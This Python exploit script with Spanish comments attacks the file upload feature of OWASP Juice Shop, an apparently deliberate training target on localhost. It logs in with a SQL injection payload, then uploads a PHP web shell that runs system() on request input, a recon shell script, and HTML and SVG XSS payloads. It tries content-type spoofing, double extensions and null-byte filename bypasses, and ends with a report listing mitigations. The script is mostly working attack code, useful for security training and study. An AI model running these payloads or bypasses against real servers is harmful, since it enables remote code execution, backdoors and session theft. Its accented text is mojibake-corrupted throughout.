#!/usr/bin/env python3
"""
File Upload Exploit - OWASP Juice Shop
Vulnerabilidad 9: Injection - File Upload Inseguro
Autor: Security Researcher
"""

import requests
import os
import random
import string
from urllib.parse import urljoin

class FileUploadExploit:
    def __init__(self, target_url="http://localhost:3000"):
        self.target_url = target_url
        self.session = requests.Session()
        self.setup_authentication()
        self.upload_endpoint = self.discover_upload_endpoint()
    
    def setup_authentication(self):
        """Configurar autenticaciÃ³n"""
        print("[+] Configurando autenticaciÃ³n...")
        try:
            response = requests.post(
                f"{self.target_url}/rest/user/login",
                json={"email": "' OR 1=1--", "password": "test"}
            )
            
            if response.status_code == 200:
                token = response.json().get('authentication', {}).get('token')
                if token:
                    self.session.headers.update({'Authorization': f'Bearer {token}'})
                    print("[+] AutenticaciÃ³n exitosa")
                    return True
        except Exception as e:
            print(f"[-] Error de autenticaciÃ³n: {e}")
        return False
    
    def discover_upload_endpoint(self):
        """Descubrir endpoint de upload"""
        print("[ğŸ”] Descubriendo endpoint de upload...")
        
        # Endpoints comunes en Juice Shop
        potential_endpoints = [
            '/api/Feedbacks',      # Sistema de feedback
            '/rest/feedbacks',
            '/profile',            # Perfil de usuario
            '/api/Users/profile',
            '/file-upload',        # Upload directo
            '/api/FileUpload',
        ]
        
        for endpoint in potential_endpoints:
            print(f"  Probando: {endpoint}")
            
            # Probar con archivo simple
            test_file = ('test.txt', 'test content', 'text/plain')
            
            try:
                response = self.session.post(
                    urljoin(self.target_url, endpoint),
                    files={'file': test_file}
                )
                
                if response.status_code in [200, 201]:
                    print(f"  âœ… ENDPOINT ENCONTRADO: {endpoint}")
                    return endpoint
                else:
                    print(f"    Status: {response.status_code}")
                    
            except Exception as e:
                print(f"    Error: {e}")
        
        print("[-] No se encontrÃ³ endpoint de upload")
        return None
    
    def create_malicious_payloads(self):
        """Crear payloads maliciosos"""
        print("[+] Creando archivos maliciosos...")
        
        payloads = []
        
        # 1. Shell Script
        shell_payload = """#!/bin/bash
echo "=== File Upload Exploit ==="
echo "Usuario: $(whoami)"
echo "Hostname: $(hostname)"
echo "Directorio: $(pwd)"
echo "=== Fin del exploit ==="
"""
        with open('exploit.sh', 'w') as f:
            f.write(shell_payload)
        payloads.append(('exploit.sh', shell_payload, 'application/x-sh'))
        
        # 2. PHP Shell
        php_payload = """<?php
header('Content-Type: text/plain');
echo "PHP Shell\\n";
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
if(isset($_POST['cmd'])) {
    system($_POST['cmd']);
}
?>"""
        with open('shell.php', 'w') as f:
            f.write(php_payload)
        payloads.append(('shell.php', php_payload, 'application/x-php'))
        
        # 3. HTML con XSS
        html_payload = """<html>
<body>
<script>
alert('XSS via File Upload');
document.write('<h1>File Upload Exploit</h1>');
</script>
</body>
</html>"""
        with open('xss.html', 'w') as f:
            f.write(html_payload)
        payloads.append(('xss.html', html_payload, 'text/html'))
        
        # 4. SVG con XSS
        svg_payload = """<svg xmlns="http://www.w3.org/2000/svg">
<script>alert('SVG XSS')</script>
<text x="20" y="20">SVG Exploit</text>
</svg>"""
        with open('xss.svg', 'w') as f:
            f.write(svg_payload)
        payloads.append(('xss.svg', svg_payload, 'image/svg+xml'))
        
        return payloads
    
    def test_upload_bypass_techniques(self, filename, content, original_type):
        """Probar tÃ©cnicas de bypass"""
        print(f"\n  ğŸ¯ Probando: {filename}")
        
        techniques = [
            {
                'name': 'Original',
                'filename': filename,
                'content_type': original_type
            },
            {
                'name': 'Content-Type Spoofing',
                'filename': filename,
                'content_type': 'image/jpeg'
            },
            {
                'name': 'Doble ExtensiÃ³n',
                'filename': filename + '.jpg',
                'content_type': 'image/jpeg'
            },
            {
                'name': 'MayÃºsculas',
                'filename': filename.upper(),
                'content_type': 'image/jpeg'
            },
            {
                'name': 'Sin ExtensiÃ³n',
                'filename': 'fileupload',
                'content_type': 'image/jpeg'
            },
            {
                'name': 'Null Byte',
                'filename': filename + '.jpg%00.' + filename.split('.')[-1],
                'content_type': 'image/jpeg'
            },
        ]
        
        for technique in techniques:
            print(f"    ğŸ› ï¸  {technique['name']}: {technique['filename']}")
            
            try:
                files = {'file': (technique['filename'], content, technique['content_type'])}
                
                response = self.session.post(
                    urljoin(self.target_url, self.upload_endpoint),
                    files=files
                )
                
                print(f"      Status: {response.status_code}")
                
                if response.status_code in [200, 201]:
                    print(f"      âœ… Ã‰XITO con {technique['name']}")
                    return True
                    
            except Exception as e:
                print(f"      ğŸ’¥ Error: {e}")
        
        return False
    
    def demonstrate_file_upload_vulnerability(self):
        """Demostrar vulnerabilidad de file upload"""
        if not self.upload_endpoint:
            print("[-] No se puede continuar sin endpoint de upload")
            return
        
        print("\n[ğŸ’¥] EXPLOTANDO VULNERABILIDAD DE FILE UPLOAD")
        print(f"  Endpoint: {self.upload_endpoint}")
        
        # Crear payloads maliciosos
        malicious_payloads = self.create_malicious_payloads()
        
        success_count = 0
        for filename, content, content_type in malicious_payloads:
            if self.test_upload_bypass_techniques(filename, content, content_type):
                success_count += 1
                print(f"  ğŸ’£ EXPLOIT EXITOSO: {filename}")
        
        print(f"\n  ğŸ“Š RESUMEN: {success_count}/{len(malicious_payloads)} archivos subidos")
        
        # Limpiar archivos temporales
        for filename, _, _ in malicious_payloads:
            if os.path.exists(filename):
                os.remove(filename)
        
        return success_count > 0
    
    def demonstrate_impact_scenarios(self):
        """Demostrar escenarios de impacto"""
        print("\n[ğŸ¯] ESCENARIOS DE IMPACTO")
        
        if not self.upload_endpoint:
            return
        
        scenarios = [
            {
                'name': 'Web Shell',
                'description': 'Subir shell PHP para ejecuciÃ³n remota de comandos',
                'impact': 'ALTO - Control completo del servidor'
            },
            {
                'name': 'XSS Persistente',
                'description': 'Subir HTML/JS malicioso para ataques XSS persistentes',
                'impact': 'MEDIO - Robo de sesiones, phishing'
            },
            {
                'name': 'SVG XSS',
                'description': 'Explotar renderizado de SVG para ejecuciÃ³n de scripts',
                'impact': 'MEDIO - EjecuciÃ³n de cÃ³digo en contexto de vÃ­ctima'
            },
            {
                'name': 'Backdoor',
                'description': 'Subir scripts de shell para acceso persistente',
                'impact': 'ALTO - Acceso backdoor al sistema'
            }
        ]
        
        for scenario in scenarios:
            print(f"  ğŸ“‹ {scenario['name']}:")
            print(f"    DescripciÃ³n: {scenario['description']}")
            print(f"    Impacto: {scenario['impact']}")
    
    def generate_vulnerability_report(self):
        """Generar reporte de vulnerabilidad"""
        print("\n" + "="*60)
        print("      REPORTE VULNERABILIDAD 9 - FILE UPLOAD INSEGURO")
        print("="*60)
        
        print("\nğŸ” INFORMACIÃ“N TÃ‰CNICA:")
        print(f"  â€¢ Endpoint vulnerable: {self.upload_endpoint}")
        print("  â€¢ MÃ©todo: POST")
        print("  â€¢ Tipo: Injection")
        print("  â€¢ CategorÃ­a OWASP: A03:2021")
        print("  â€¢ CWE: CWE-434 - Unrestricted Upload of File")
        
        print("\nğŸ¯ TÃ‰CNICAS DE BYPASS PROBADAS:")
        print("  1. Spoofing de Content-Type")
        print("  2. Doble extensiÃ³n (.php.jpg)")
        print("  3. ExtensiÃ³n en mayÃºsculas (.PHP)")
        print("  4. Null byte injection")
        print("  5. Archivos sin extensiÃ³n")
        
        print("\nğŸ’¥ IMPACTO DE SEGURIDAD:")
        print("  â€¢ EjecuciÃ³n remota de cÃ³digo (RCE)")
        print("  â€¢ Compromiso completo del servidor")
        print("  â€¢ XSS persistente")
        print("  â€¢ Backdoor installation")
        print("  â€¢ Defacement del sitio")
        
        print("\nğŸ›¡ï¸ RECOMENDACIONES DE MITIGACIÃ“N (ASVS V7.1.1):")
        print("  â€¢ Validar tipo MIME real del archivo")
        print("  â€¢ Verificar magic numbers/file signatures")
        print("  â€¢ Restringir extensiones ejecutables")
        print("  â€¢ Almacenar archivos fuera del webroot")
        print("  â€¢ Escanear archivos con antivirus")
        print("  â€¢ Implementar lista blanca de tipos")
        
        print("\nğŸ“‹ EVIDENCIA TÃ‰CNICA:")
        print("  Request:")
        print("    POST /api/Feedbacks HTTP/1.1")
        print("    Content-Type: multipart/form-data")
        print('    Content-Disposition: form-data; name="file"; filename="shell.php.jpg"')
        print("    Content-Type: image/jpeg")
        print("    <?php system($_GET['cmd']); ?>")
        
        print("\nâš–ï¸ SEVERIDAD: ALTA")
        print("  â€¢ Probabilidad: MEDIA")
        print("  â€¢ Impacto: ALTO (RCE posible)")
        print("  â€¢ ExplotaciÃ³n: MEDIA")
        
        print("\n" + "="*60)
    
    def run_complete_exploitation(self):
        """Ejecutar explotaciÃ³n completa"""
        print("""
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘   VULNERABILIDAD 9 - FILE UPLOAD INSEGURO     â•‘
    â•‘         OWASP Juice Shop                       â•‘
    â•‘        A03:2021 - Injection                   â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        """)
        
        # Ejecutar explotaciÃ³n
        if self.upload_endpoint:
            self.demonstrate_file_upload_vulnerability()
            self.demonstrate_impact_scenarios()
        else:
            print("[-] No se pudo encontrar endpoint de upload")
        
        # Generar reporte
        self.generate_vulnerability_report()
        
        print("\nâœ… EXPLOTACIÃ“N COMPLETADA")

def main():
    exploit = FileUploadExploit("http://localhost:3000")
    exploit.run_complete_exploitation()

if __name__ == "__main__":
    main()
